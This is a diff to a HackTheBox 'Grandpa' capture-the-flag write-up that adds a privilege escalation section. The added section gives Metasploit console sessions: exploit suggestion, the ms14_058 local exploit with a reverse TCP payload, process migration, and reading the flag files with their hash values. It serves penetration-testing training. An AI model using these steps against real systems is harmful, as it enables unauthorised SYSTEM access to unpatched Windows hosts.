@@ -1,13 +1,11 @@
-# References
-1. [Grandpa Writeup (x.com)]()
-2. [Grandpa Writeup (x.com)]()
-
 # Summary
 ### 1. NMAP
 
 ### 2. Enumeration
 
 ### 3. Exploit
+
+### 4. Privilege Escalation
 
 # Attack
 ## 1. NMAP
@@ -173,3 +171,147 @@ meterpreter > getuid
 [-] stdapi_sys_config_getuid: Operation failed: Access is denied.
 ```
 Time for privilege escalation.
+
+## 4. Privilege Escalation
+Since we got a Meterpreter shell, we can just run the `/recon/local_exploit_suggester`.
+```
+[*] 10.10.10.14 - Collecting local exploits for x86/windows...
+[*] 10.10.10.14 - 34 exploit checks are being tried...
+nil versions are discouraged and will be deprecated in Rubygems 4
+[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+```
+Wow, again full of exploits we can potentially use.
+
+Let's run the first one, `exploit/windows/local/ms14_058_track_popup_menu`.
+```
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > back
+msf5 > use exploit/windows/local/ms14_058_track_popup_menu
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:5555 
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
+[*] Exploit completed, but no session was created.
+```
+Access is denied. Maybe it is because we are in a directory where this exploit do not have write permissions. We first saw this in [Devel](https://github.com/HippoEug/HackTheBox/blob/main/Machines%20(Easy)/Devel.md), where we had to navigate to the %temp% folder with the meterpreter shell. This is best explained by the official write up, "By default, the working directory is set to c:\windows\system32\inetsrv, which the IIS user does not have write permissions for. Navigating to c:\windows\TEMP is a good idea, as a large portion of Metasploit’s Windows privilege escalation modules require a file to be written to the target during exploitation."
+
+Let's move to `%temp`.
+```
+meterpreter > cd %temp%
+meterpreter > pwd
+C:\WINDOWS\TEMP
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > show options
+...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
+
+[*] Started reverse TCP handler on 10.10.x.x:5555 
+[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
+[*] Exploit completed, but no session was created.
+```
+Nope, still the same error.
+
+After reading up on Official Guide, we see that it is suggested to migrate to a process running under NT AUTHORITY\NETWORK SERVICE.
+```
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]                                                
+ 4     0     System                                                          
+ 272   4     smss.exe                                                        
+ 324   272   csrss.exe                                                       
+ 348   272   winlogon.exe                                                    
+ 396   348   services.exe                                                    
+ 408   348   lsass.exe                                                       
+ 612   396   svchost.exe                                                     
+ 684   396   svchost.exe                                                     
+ 740   396   svchost.exe                                                     
+ 768   396   svchost.exe                                                     
+ 804   396   svchost.exe                                                     
+ 940   396   spoolsv.exe                                                     
+ 968   396   msdtc.exe                                                       
+ 1088  396   cisvc.exe                                                       
+ 1128  396   svchost.exe                                                     
+ 1184  396   inetinfo.exe                                                    
+ 1224  396   svchost.exe                                                     
+ 1324  396   VGAuthService.exe                                               
+ 1412  396   vmtoolsd.exe                                                    
+ 1460  396   svchost.exe                                                     
+ 1600  396   svchost.exe                                                     
+ 1692  1088  cidaemon.exe                                                    
+ 1792  396   alg.exe                                                         
+ 1808  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1920  396   dllhost.exe                                                     
+ 2180  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 2248  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 2300  2180  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+ 2316  1088  cidaemon.exe                                                    
+ 2340  1088  cidaemon.exe                                                    
+ 2488  612   wmiprvse.exe                                                    
+ 2900  348   logon.scr                                                       
+ 3100  1460  w3wp.exe                                                        
+ 3676  612   davcdata.exe                                                    
+
+meterpreter > migrate 1808
+[*] Migrating from 2300 to 1808...
+[*] Migration completed successfully.
+meterpreter > 
+```
+Done. Let's get back to our privilege escalation exploit.
+```
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 exploit(windows/local/ms14_058_track_popup_menu) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.15:5555 
+[*] Launching notepad to host the exploit...
+[+] Process 3060 launched.
+[*] Reflectively injecting the exploit DLL into 3060...
+[*] Injecting exploit into 3060...
+[*] Exploit injected. Injecting payload into 3060...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (176195 bytes) to 10.10.10.14
+[*] Meterpreter session 2 opened (10.10.14.15:5555 -> 10.10.10.14:1032) at 2021-01-26 19:47:34 +0800
+
+meterpreter > 
+```
+Done! Time to just find flags!
+```
+meterpreter > dir
+Listing: C:\Documents and Settings\Administrator\Desktop
+========================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-12 22:28:50 +0800  root.txt
+
+meterpreter > cat root.txt
+9359e905a2c35f861f6a57cecf28bb7b
+...
+Listing: C:\Documents and Settings\Harry\Desktop
+================================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100444/r--r--r--  32    fil   2017-04-12 22:32:09 +0800  user.txt
+
+meterpreter > cat user.txt
+bdff5ec67c3cff017f2bedc146a5d869
+```
